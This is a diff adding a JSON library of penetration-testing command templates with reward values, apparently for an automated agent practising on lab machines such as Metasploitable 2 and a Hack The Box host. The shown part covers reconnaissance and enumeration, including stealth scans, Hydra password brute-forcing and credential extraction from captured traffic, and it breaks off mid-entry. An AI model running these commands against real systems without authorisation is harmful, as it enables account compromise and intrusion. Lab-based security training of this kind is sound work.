@@ -1,0 +1,6608 @@
+{
+  "total_commands": 279,
+  "phase_counts": {
+    "RECON": 29,
+    "ENUMERATION": 54,
+    "EXPLOITATION": 102,
+    "PRIVILEGE_ESCALATION": 35,
+    "LATERAL_MOVEMENT": 15,
+    "EXFILTRATION": 11,
+    "POST_EXPLOITATION": 20,
+    "CLOSEOUT": 13
+  },
+  "commands": {
+    "nmap_quick_scan": {
+      "template": "nmap -sn {target_range}",
+      "phase": "RECON",
+      "description": "Quick ping sweep to discover live hosts. Use first to find targets.",
+      "required_params": [
+        "target_range"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "Host is up",
+        "hosts up"
+      ],
+      "tags": [
+        "discovery",
+        "network"
+      ],
+      "typical_reward": 0.5
+    },
+    "nmap_top_ports": {
+      "template": "nmap -sT --top-ports {num_ports} {target}",
+      "phase": "RECON",
+      "description": "Scan top N most common ports. Good balance of speed and coverage.",
+      "required_params": [
+        "target",
+        "num_ports"
+      ],
+      "optional_params": {
+        "num_ports": "100"
+      },
+      "preconditions": [],
+      "success_indicators": [
+        "open",
+        "filtered"
+      ],
+      "tags": [
+        "network",
+        "ports"
+      ],
+      "typical_reward": 1.0
+    },
+    "nmap_full_tcp": {
+      "template": "nmap -sT -p- --min-rate {rate} {target}",
+      "phase": "RECON",
+      "description": "Full TCP port scan. Slow but thorough - finds non-standard ports.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "rate": "5000"
+      },
+      "preconditions": [],
+      "success_indicators": [
+        "open"
+      ],
+      "tags": [
+        "thorough",
+        "network",
+        "ports"
+      ],
+      "typical_reward": 1.5
+    },
+    "nmap_service_version": {
+      "template": "nmap -sV -sC -p {ports} {target}",
+      "phase": "RECON",
+      "description": "Version detection and default scripts on specific ports. Use after finding open ports.",
+      "required_params": [
+        "target",
+        "ports"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "VERSION",
+        "Service Info"
+      ],
+      "tags": [
+        "versions",
+        "network",
+        "enumeration"
+      ],
+      "typical_reward": 2.0
+    },
+    "nmap_vuln_scan": {
+      "template": "nmap --script vuln -p {ports} {target}",
+      "phase": "RECON",
+      "description": "Run vulnerability scanning scripts. Use after version detection.",
+      "required_params": [
+        "target",
+        "ports"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "services_enumerated"
+      ],
+      "success_indicators": [
+        "VULNERABLE",
+        "CVE-"
+      ],
+      "tags": [
+        "vulnerability",
+        "network"
+      ],
+      "typical_reward": 3.0
+    },
+    "nmap_udp_scan": {
+      "template": "nmap -sU --top-ports {num_ports} {target}",
+      "phase": "RECON",
+      "description": "UDP port scan. Slow but finds SNMP, DNS, TFTP, NTP services.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "num_ports": "50"
+      },
+      "preconditions": [],
+      "success_indicators": [
+        "open",
+        "open|filtered"
+      ],
+      "tags": [
+        "udp",
+        "network"
+      ],
+      "typical_reward": 1.5
+    },
+    "masscan_fast": {
+      "template": "masscan {target_range} -p {ports} --rate {rate}",
+      "phase": "RECON",
+      "description": "Ultra-fast port scanner. Use for large network ranges.",
+      "required_params": [
+        "target_range",
+        "ports"
+      ],
+      "optional_params": {
+        "rate": "10000"
+      },
+      "preconditions": [],
+      "success_indicators": [
+        "Discovered open port"
+      ],
+      "tags": [
+        "fast",
+        "network"
+      ],
+      "typical_reward": 1.0
+    },
+    "nmap_os_detection": {
+      "template": "nmap -O -sV {target}",
+      "phase": "RECON",
+      "description": "OS fingerprinting. Helps identify Windows vs Linux targets.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "OS details",
+        "Running:"
+      ],
+      "tags": [
+        "os",
+        "network"
+      ],
+      "typical_reward": 1.5
+    },
+    "whatweb": {
+      "template": "whatweb -a 3 {url}",
+      "phase": "RECON",
+      "description": "Identify web technologies, CMS, frameworks. First step for web targets.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "WordPress",
+        "Apache",
+        "nginx",
+        "PHP"
+      ],
+      "tags": [
+        "web",
+        "fingerprint"
+      ],
+      "typical_reward": 1.0
+    },
+    "curl_headers": {
+      "template": "curl -I -s {url}",
+      "phase": "RECON",
+      "description": "Fetch HTTP headers. Reveals server info, security headers.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "Server:",
+        "X-Powered-By"
+      ],
+      "tags": [
+        "headers",
+        "web"
+      ],
+      "typical_reward": 0.5
+    },
+    "nmap_stealth_scan": {
+      "template": "nmap -sT -T2 --max-retries 1 -Pn {target}",
+      "phase": "RECON",
+      "description": "SYN stealth scan \u2014 avoids completing TCP handshake for lower detection.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "open",
+        "Host is up"
+      ],
+      "tags": [
+        "stealth",
+        "nmap",
+        "recon"
+      ],
+      "typical_reward": 3.0
+    },
+    "nmap_comprehensive": {
+      "template": "nmap -sT -sC -sV --top-ports 1000 -T4 {target}",
+      "phase": "RECON",
+      "description": "Comprehensive nmap scan with scripts and service versions (no -O, as that requires root).",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "open",
+        "Host is up",
+        "Service Info"
+      ],
+      "tags": [
+        "thorough",
+        "nmap",
+        "recon"
+      ],
+      "typical_reward": 5.0
+    },
+    "dns_enum": {
+      "template": "dnsenum --enum {target}",
+      "phase": "RECON",
+      "description": "DNS enumeration including zone transfer attempts and subdomain brute force.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "Name Servers",
+        "Zone Transfer",
+        "found"
+      ],
+      "tags": [
+        "dns",
+        "recon",
+        "enumeration"
+      ],
+      "typical_reward": 3.0
+    },
+    "whois_lookup": {
+      "template": "whois {target}",
+      "phase": "RECON",
+      "description": "WHOIS lookup for domain registration and contact information.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "Registrant",
+        "Name Server",
+        "Creation Date"
+      ],
+      "tags": [
+        "recon",
+        "passive",
+        "osint"
+      ],
+      "typical_reward": 2.0
+    },
+    "nmap_port_21": {
+      "template": "nmap -sV -p 21 {target}",
+      "phase": "RECON",
+      "description": "Scan FTP port for vsftpd version detection on MS2.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "vsftpd",
+        "21/tcp",
+        "open"
+      ],
+      "tags": [
+        "ftp",
+        "ms2",
+        "recon"
+      ],
+      "typical_reward": 3.0
+    },
+    "nmap_port_6667": {
+      "template": "nmap -sV -p 6667 {target}",
+      "phase": "RECON",
+      "description": "Scan IRC port for UnrealIRCd on MS2.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "UnrealIRCd",
+        "6667/tcp",
+        "open",
+        "irc"
+      ],
+      "tags": [
+        "ms2",
+        "irc",
+        "recon"
+      ],
+      "typical_reward": 3.0
+    },
+    "nmap_port_1524": {
+      "template": "nmap -sV --version-intensity 0 -p 1524 {target}",
+      "phase": "RECON",
+      "description": "Scan for ingreslock backdoor shell on port 1524.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "1524/tcp",
+        "open",
+        "bindshell",
+        "ingreslock"
+      ],
+      "tags": [
+        "ms2",
+        "backdoor",
+        "recon"
+      ],
+      "typical_reward": 3.0
+    },
+    "nmap_port_8180": {
+      "template": "nmap -sV --version-intensity 0 -p 8180 {target}",
+      "phase": "RECON",
+      "description": "Scan for Apache Tomcat on port 8180.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "8180/tcp",
+        "open",
+        "Tomcat",
+        "http"
+      ],
+      "tags": [
+        "ms2",
+        "web",
+        "recon"
+      ],
+      "typical_reward": 3.0
+    },
+    "nmap_port_5432": {
+      "template": "nmap -sV -p 5432 {target}",
+      "phase": "RECON",
+      "description": "Scan for PostgreSQL on port 5432.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "5432/tcp",
+        "open",
+        "PostgreSQL",
+        "postgresql"
+      ],
+      "tags": [
+        "ms2",
+        "db",
+        "recon"
+      ],
+      "typical_reward": 3.0
+    },
+    "nmap_rservices": {
+      "template": "nmap -sV --version-intensity 0 -p 512,513,514 {target}",
+      "phase": "RECON",
+      "description": "Scan for r-services (rexec, rlogin, rsh) on ports 512-514.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "512/tcp",
+        "513/tcp",
+        "514/tcp",
+        "open",
+        "exec",
+        "login",
+        "shell"
+      ],
+      "tags": [
+        "ms2",
+        "rservices",
+        "recon"
+      ],
+      "typical_reward": 3.0
+    },
+    "rpcinfo_check": {
+      "template": "rpcinfo -p {target}",
+      "phase": "RECON",
+      "description": "Check RPC services to find NFS and mountd.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "nfs",
+        "mountd",
+        "portmapper",
+        "2049"
+      ],
+      "tags": [
+        "ms2",
+        "rpc",
+        "recon",
+        "nfs"
+      ],
+      "typical_reward": 5.0
+    },
+    "install_apt_package": {
+      "template": "sudo apt-get install -y {package}",
+      "phase": "RECON",
+      "description": "Install a system package via apt (requires sudo)",
+      "required_params": [
+        "package"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "Setting up",
+        "is already the newest version"
+      ],
+      "tags": [
+        "system",
+        "install"
+      ],
+      "typical_reward": 0.0
+    },
+    "install_pipx_package": {
+      "template": "pipx install {package}",
+      "phase": "RECON",
+      "description": "Install a Python tool via pipx (user-space)",
+      "required_params": [
+        "package"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "installed package",
+        "already installed"
+      ],
+      "tags": [
+        "python",
+        "install"
+      ],
+      "typical_reward": 0.0
+    },
+    "install_pip_package": {
+      "template": "pip install {package}",
+      "phase": "RECON",
+      "description": "Install a Python package via pip",
+      "required_params": [
+        "package"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "Successfully installed",
+        "already satisfied"
+      ],
+      "tags": [
+        "python",
+        "install"
+      ],
+      "typical_reward": 0.0
+    },
+    "install_go_tool": {
+      "template": "go install {module}",
+      "phase": "RECON",
+      "description": "Install a Go tool via go install",
+      "required_params": [
+        "module"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "go: downloading"
+      ],
+      "tags": [
+        "go",
+        "install"
+      ],
+      "typical_reward": 0.0
+    },
+    "clone_repo_tool": {
+      "template": "git clone --depth 1 {url} {dest}",
+      "phase": "RECON",
+      "description": "Clone a tool repository",
+      "required_params": [
+        "url",
+        "dest"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "Cloning into",
+        "done"
+      ],
+      "tags": [
+        "git",
+        "install"
+      ],
+      "typical_reward": 0.0
+    },
+    "knock_sequence": {
+      "template": "knock -d {delay} {target} {ports}",
+      "phase": "RECON",
+      "description": "Execute a port knocking sequence to unlock hidden services",
+      "required_params": [
+        "target",
+        "ports"
+      ],
+      "optional_params": {
+        "delay": "500"
+      },
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "knock complete",
+        "sequence sent"
+      ],
+      "tags": [
+        "stealth",
+        "knock",
+        "network"
+      ],
+      "typical_reward": 5.0
+    },
+    "knock_sequence_udp": {
+      "template": "for port in {ports}; do nmap -Pn -sU -p $port --max-retries 0 {target} && sleep {delay}; done",
+      "phase": "RECON",
+      "description": "UDP port knocking via nmap probes",
+      "required_params": [
+        "target",
+        "ports"
+      ],
+      "optional_params": {
+        "delay": "0.5"
+      },
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "scan report"
+      ],
+      "tags": [
+        "udp",
+        "knock",
+        "network"
+      ],
+      "typical_reward": 5.0
+    },
+    "verify_port_open": {
+      "template": "nmap -Pn -sT -p {port} --max-retries 2 {target}",
+      "phase": "RECON",
+      "description": "Quick verify if a specific port is open (used after knock)",
+      "required_params": [
+        "target",
+        "port"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "open",
+        "syn-ack"
+      ],
+      "tags": [
+        "verify",
+        "network"
+      ],
+      "typical_reward": 2.0
+    },
+    "gobuster_dir": {
+      "template": "gobuster dir -u {url} -w {wordlist} -x {extensions} -t {threads} --no-error -b 302,404",
+      "phase": "ENUMERATION",
+      "description": "Directory and file brute-forcing. Essential for web targets.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {
+        "wordlist": "/usr/share/dirb/wordlists/common.txt",
+        "extensions": "php,html,txt,bak",
+        "threads": "50"
+      },
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "Status: 200",
+        "Status: 301"
+      ],
+      "tags": [
+        "web",
+        "directories",
+        "bruteforce"
+      ],
+      "typical_reward": 2.0
+    },
+    "gobuster_vhost": {
+      "template": "gobuster vhost -u http://{domain} -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt --append-domain -t 30",
+      "phase": "ENUMERATION",
+      "description": "Virtual host discovery. Find hidden subdomains on same IP. Must use domain (not IP) so --append-domain sends correct Host headers.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "domain": "soulmate.htb"
+      },
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "Found:"
+      ],
+      "tags": [
+        "vhost",
+        "web",
+        "subdomain"
+      ],
+      "typical_reward": 2.5
+    },
+    "ffuf_fuzz": {
+      "template": "ffuf -u {url}/FUZZ -w {wordlist} -mc {match_codes} -t {threads}",
+      "phase": "ENUMERATION",
+      "description": "Fast web fuzzer. Use for directory/file discovery or parameter fuzzing.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {
+        "wordlist": "/usr/share/dirb/wordlists/common.txt",
+        "match_codes": "200,301,302,401,403",
+        "threads": "50"
+      },
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "Status: 200",
+        "[Status:"
+      ],
+      "tags": [
+        "web",
+        "fuzzing"
+      ],
+      "typical_reward": 2.0
+    },
+    "nikto_scan": {
+      "template": "nikto -h {url} -C all -maxtime 30s",
+      "phase": "ENUMERATION",
+      "description": "Web vulnerability scanner (30s max). Finds common misconfigs and vulns.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "OSVDB-",
+        "+ /",
+        "vulnerab"
+      ],
+      "tags": [
+        "web",
+        "vulnerability"
+      ],
+      "typical_reward": 2.0
+    },
+    "wfuzz_params": {
+      "template": "wfuzz -c -z file,{wordlist} -d '{post_data}' --hc 404 {url}",
+      "phase": "ENUMERATION",
+      "description": "Parameter fuzzing for forms. Find hidden parameters.",
+      "required_params": [
+        "url",
+        "post_data"
+      ],
+      "optional_params": {
+        "wordlist": "/usr/share/dirb/wordlists/common.txt"
+      },
+      "preconditions": [
+        "http_service_found",
+        "form_found"
+      ],
+      "success_indicators": [
+        "C=200",
+        "C=302"
+      ],
+      "tags": [
+        "web",
+        "fuzzing",
+        "parameters"
+      ],
+      "typical_reward": 2.0
+    },
+    "feroxbuster": {
+      "template": "feroxbuster -u {url} -w {wordlist} -x {extensions} --depth {depth}",
+      "phase": "ENUMERATION",
+      "description": "Recursive content discovery. Better than gobuster for deep sites.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {
+        "wordlist": "/usr/share/dirb/wordlists/common.txt",
+        "extensions": "php,html,txt",
+        "depth": "3"
+      },
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "200",
+        "301"
+      ],
+      "tags": [
+        "web",
+        "directories",
+        "recursive"
+      ],
+      "typical_reward": 2.0
+    },
+    "smbclient_list": {
+      "template": "smbclient -L //{target} -N",
+      "phase": "ENUMERATION",
+      "description": "List SMB shares anonymously. First step for SMB.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "Sharename",
+        "IPC$",
+        "Disk"
+      ],
+      "tags": [
+        "smb",
+        "shares"
+      ],
+      "typical_reward": 1.5
+    },
+    "smbclient_connect": {
+      "template": "smbclient //{target}/{share} -N",
+      "phase": "ENUMERATION",
+      "description": "Connect to SMB share anonymously. Look for sensitive files.",
+      "required_params": [
+        "target",
+        "share"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "share_discovered",
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "smb:",
+        "Try \"help\""
+      ],
+      "tags": [
+        "smb",
+        "access"
+      ],
+      "typical_reward": 2.0
+    },
+    "smbclient_auth": {
+      "template": "smbclient //{target}/{share} -U {username}%{password}",
+      "phase": "ENUMERATION",
+      "description": "Connect to SMB share with credentials.",
+      "required_params": [
+        "target",
+        "share",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known",
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "smb:",
+        "Try \"help\""
+      ],
+      "tags": [
+        "smb",
+        "authenticated"
+      ],
+      "typical_reward": 2.5
+    },
+    "smbmap_shares": {
+      "template": "smbmap -H {target} -u {username} -p {password}",
+      "phase": "ENUMERATION",
+      "description": "Enumerate SMB share permissions. Shows read/write access.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "username": "guest",
+        "password": ""
+      },
+      "preconditions": [
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "READ",
+        "WRITE",
+        "Disk"
+      ],
+      "tags": [
+        "permissions",
+        "smb"
+      ],
+      "typical_reward": 2.0
+    },
+    "enum4linux_full": {
+      "template": "enum4linux -a {target}",
+      "phase": "ENUMERATION",
+      "description": "Full SMB/NetBIOS enumeration. Gets users, shares, policies.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "user:",
+        "group:",
+        "share:"
+      ],
+      "tags": [
+        "smb",
+        "comprehensive",
+        "users"
+      ],
+      "typical_reward": 3.0
+    },
+    "enum4linux_ng": {
+      "template": "enum4linux-ng -A {target}",
+      "phase": "ENUMERATION",
+      "description": "Modern enum4linux. Better parsing and output.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "Users:",
+        "Groups:",
+        "Shares:"
+      ],
+      "tags": [
+        "modern",
+        "smb"
+      ],
+      "typical_reward": 3.0
+    },
+    "ldapsearch_base": {
+      "template": "ldapsearch -x -H ldap://{target} -b '{base_dn}'",
+      "phase": "ENUMERATION",
+      "description": "Query LDAP anonymously. Get domain info.",
+      "required_params": [
+        "target",
+        "base_dn"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ldap_service_found"
+      ],
+      "success_indicators": [
+        "dn:",
+        "objectClass"
+      ],
+      "tags": [
+        "domain",
+        "ldap"
+      ],
+      "typical_reward": 2.0
+    },
+    "ldapsearch_users": {
+      "template": "ldapsearch -x -H ldap://{target} -b '{base_dn}' '(objectClass=user)' sAMAccountName",
+      "phase": "ENUMERATION",
+      "description": "Enumerate domain users via LDAP.",
+      "required_params": [
+        "target",
+        "base_dn"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ldap_service_found"
+      ],
+      "success_indicators": [
+        "sAMAccountName:",
+        "dn:"
+      ],
+      "tags": [
+        "users",
+        "ldap"
+      ],
+      "typical_reward": 2.5
+    },
+    "windapsearch": {
+      "template": "windapsearch -d {domain} --dc-ip {target} -U",
+      "phase": "ENUMERATION",
+      "description": "Enumerate AD users via LDAP. Clean output.",
+      "required_params": [
+        "target",
+        "domain"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ldap_service_found"
+      ],
+      "success_indicators": [
+        "sAMAccountName",
+        "cn:"
+      ],
+      "tags": [
+        "ad",
+        "users",
+        "ldap"
+      ],
+      "typical_reward": 2.5
+    },
+    "dig_any": {
+      "template": "dig ANY @{target} {domain}",
+      "phase": "ENUMERATION",
+      "description": "Query all DNS records. Get subdomains, mail servers.",
+      "required_params": [
+        "target",
+        "domain"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "dns_service_found"
+      ],
+      "success_indicators": [
+        "ANSWER SECTION",
+        "A ",
+        "MX "
+      ],
+      "tags": [
+        "dns",
+        "records"
+      ],
+      "typical_reward": 1.5
+    },
+    "dig_axfr": {
+      "template": "dig AXFR @{target} {domain}",
+      "phase": "ENUMERATION",
+      "description": "Attempt DNS zone transfer. Reveals all records if misconfigured.",
+      "required_params": [
+        "target",
+        "domain"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "dns_service_found"
+      ],
+      "success_indicators": [
+        "XFR size",
+        "ANSWER:"
+      ],
+      "tags": [
+        "dns",
+        "zone_transfer"
+      ],
+      "typical_reward": 4.0
+    },
+    "dnsrecon": {
+      "template": "dnsrecon -d {domain} -n {target} -t std",
+      "phase": "ENUMERATION",
+      "description": "Comprehensive DNS enumeration. Multiple query types.",
+      "required_params": [
+        "domain",
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "dns_service_found"
+      ],
+      "success_indicators": [
+        "[*] ",
+        "A ",
+        "NS "
+      ],
+      "tags": [
+        "dns",
+        "comprehensive"
+      ],
+      "typical_reward": 2.0
+    },
+    "ssh_audit": {
+      "template": "ssh-audit {target}",
+      "phase": "ENUMERATION",
+      "description": "Audit SSH configuration. Find weak algorithms and vulns.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ssh_service_found"
+      ],
+      "success_indicators": [
+        "(rec)",
+        "(warn)",
+        "vulnerability"
+      ],
+      "tags": [
+        "audit",
+        "ssh"
+      ],
+      "typical_reward": 1.5
+    },
+    "snmpwalk": {
+      "template": "snmpwalk -c {community} -v {version} {target}",
+      "phase": "ENUMERATION",
+      "description": "Walk SNMP tree. Reveals system info, interfaces, processes.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "community": "public",
+        "version": "2c"
+      },
+      "preconditions": [
+        "snmp_service_found"
+      ],
+      "success_indicators": [
+        "STRING:",
+        "INTEGER:",
+        "iso."
+      ],
+      "tags": [
+        "snmp",
+        "information"
+      ],
+      "typical_reward": 3.0
+    },
+    "onesixtyone": {
+      "template": "onesixtyone -c {wordlist} {target}",
+      "phase": "ENUMERATION",
+      "description": "SNMP community string brute-force.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "wordlist": "/usr/share/nmap/nselib/data/snmpcommunities.lst"
+      },
+      "preconditions": [
+        "snmp_service_found"
+      ],
+      "success_indicators": [
+        "[public]",
+        "[private]"
+      ],
+      "tags": [
+        "snmp",
+        "bruteforce"
+      ],
+      "typical_reward": 2.5
+    },
+    "showmount": {
+      "template": "showmount -e {target}",
+      "phase": "ENUMERATION",
+      "description": "Show NFS exports. Find mountable shares.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "nfs_service_found"
+      ],
+      "success_indicators": [
+        "Export list",
+        "/"
+      ],
+      "tags": [
+        "nfs",
+        "shares"
+      ],
+      "typical_reward": 2.0
+    },
+    "rpcclient_null": {
+      "template": "rpcclient -U '' -N {target}",
+      "phase": "ENUMERATION",
+      "description": "Connect with null session. Enumerate users/groups.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "rpcclient $>"
+      ],
+      "tags": [
+        "null_session",
+        "rpc"
+      ],
+      "typical_reward": 2.0
+    },
+    "rpcclient_enumdomusers": {
+      "template": "rpcclient -U '' -N {target} -c 'enumdomusers'",
+      "phase": "ENUMERATION",
+      "description": "Enumerate domain users via RPC.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "null_session_allowed",
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "user:",
+        "rid:"
+      ],
+      "tags": [
+        "rpc",
+        "users"
+      ],
+      "typical_reward": 2.5
+    },
+    "ftp_anonymous": {
+      "template": "echo -e 'user anonymous\\npass\\nls -la\\nbye' | ftp -n {target}",
+      "phase": "ENUMERATION",
+      "description": "Test FTP anonymous access and list files.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ftp_service_found"
+      ],
+      "success_indicators": [
+        "230",
+        "drwx",
+        "-rw"
+      ],
+      "tags": [
+        "ftp",
+        "anonymous"
+      ],
+      "typical_reward": 2.0
+    },
+    "hydra_ssh": {
+      "template": "hydra -l {username} -P {wordlist} ssh://{target} -t {threads}",
+      "phase": "ENUMERATION",
+      "description": "Brute-force SSH credentials with Hydra.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "username": "admin",
+        "wordlist": "/usr/share/nmap/nselib/data/passwords.lst",
+        "threads": "4"
+      },
+      "preconditions": [
+        "ssh_service_found"
+      ],
+      "success_indicators": [
+        "login:",
+        "password:"
+      ],
+      "tags": [
+        "credentials",
+        "bruteforce",
+        "ssh"
+      ],
+      "typical_reward": 8.0
+    },
+    "hydra_ftp": {
+      "template": "hydra -l {username} -P {wordlist} ftp://{target}",
+      "phase": "ENUMERATION",
+      "description": "Brute-force FTP credentials with Hydra.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "username": "anonymous",
+        "wordlist": "/usr/share/nmap/nselib/data/passwords.lst"
+      },
+      "preconditions": [
+        "ftp_service_found"
+      ],
+      "success_indicators": [
+        "login:",
+        "password:"
+      ],
+      "tags": [
+        "ftp",
+        "credentials",
+        "bruteforce"
+      ],
+      "typical_reward": 7.0
+    },
+    "hydra_http_form": {
+      "template": "hydra -l {username} -P {wordlist} {target} http-post-form '{form}'",
+      "phase": "ENUMERATION",
+      "description": "Brute-force HTTP login form.",
+      "required_params": [
+        "target",
+        "form"
+      ],
+      "optional_params": {
+        "username": "admin",
+        "wordlist": "/usr/share/nmap/nselib/data/passwords.lst"
+      },
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "login:",
+        "password:"
+      ],
+      "tags": [
+        "http",
+        "web",
+        "credentials",
+        "bruteforce"
+      ],
+      "typical_reward": 8.0
+    },
+    "pcap_download_extract": {
+      "template": "wget -q http://{target}/{pcap_path} -O /tmp/capture.pcap && strings /tmp/capture.pcap | grep -iE 'USER|PASS|login|password'",
+      "phase": "ENUMERATION",
+      "description": "Download PCAP file from target and extract credentials via strings analysis.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "pcap_path": "data/0.pcap"
+      },
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "USER",
+        "PASS",
+        "login",
+        "password"
+      ],
+      "tags": [
+        "credential_extraction",
+        "htb",
+        "pcap"
+      ],
+      "typical_reward": 20.0
+    },
+    "tshark_pcap_creds": {
+      "template": "tshark -r /tmp/capture.pcap -Y 'ftp.request.command==USER||ftp.request.command==PASS' -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null || strings /tmp/capture.pcap | grep -iE 'USER|PASS'",
+      "phase": "ENUMERATION",
+      "description": "Extract FTP/HTTP credentials from PCAP using tshark structured dissection with strings fallback.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "USER",
+        "PASS"
+      ],
+      "tags": [
+        "credential_extraction",
+        "htb",
+        "pcap",
+        "tshark"
+      ],
+      "typical_reward": 20.0
+    },
+    "vhost_discover": {
+      "template": "gobuster vhost -u http://{domain} -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt --append-domain -t 30 2>/dev/null || ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt -u http://{target} -H 'Host: FUZZ.{domain}' -fs 0",
+      "phase": "ENUMERATION",
+      "description": "Discover virtual hosts on target web server. Critical for HTB boxes with multiple vhosts. Uses domain name (not IP) so gobuster sends correct Host headers.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "domain": "soulmate.htb"
+      },
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "Found:",
+        "Status:",
+        "200",
+        "301",
+        "302"
+      ],
+      "tags": [
+        "htb",
+        "web",
+        "vhost",
+        "enumeration"
+      ],
+      "typical_reward": 15.0
+    },
+    "bloodhound_python": {
+      "template": "bloodhound-python -u '{username}' -p '{password}' -d {domain} -c all -ns {target}",
+      "phase": "ENUMERATION",
+      "description": "Collect AD data for BloodHound graph analysis",
+      "required_params": [
+        "target",
+        "domain",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known"
+      ],
+      "success_indicators": [
+        "Done",
+        "users",
+        "computers",
+        "groups"
+      ],
+      "tags": [
+        "ad",
+        "windows",
+        "bloodhound",
+        "enumeration"
+      ],
+      "typical_reward": 12.0
+    },
+    "cme_ldap_users": {
+      "template": "crackmapexec ldap {target} -u {username} -p {password} --users",
+      "phase": "ENUMERATION",
+      "description": "Enumerate domain users via LDAP with CrackMapExec.",
+      "required_params": [
+        "target",
